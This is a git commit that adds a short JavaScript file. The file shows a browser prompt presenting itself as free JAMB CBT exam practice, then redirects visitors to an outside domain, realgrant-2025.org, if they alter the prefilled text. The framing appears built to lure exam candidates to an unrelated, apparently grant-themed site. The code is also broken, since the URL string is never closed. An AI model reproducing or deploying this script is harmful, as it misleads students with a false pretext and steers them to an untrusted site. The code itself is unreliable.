85b055a49ac0be2150f01ea52583a1625bedbf43
Sweetblogboi <nsiboy760@gmail.com>
2025-02-28 11:08:45 +0100

    Create jamb-active.js

---
+++ jamb-active.js
@@ -0,0 +1,6 @@
+
+var password = 'GET STARTED NOW'
+password=prompt('JAMB: Practice free Jamb CBT Questions to prepare for your upcoming exam, Kindly Press OK to get started now   ','GET STARTED NOW');
+if (password != 'GET STARTED NOW') {
+location.href='https://realgrant-2025.org/jamb.html;
+}
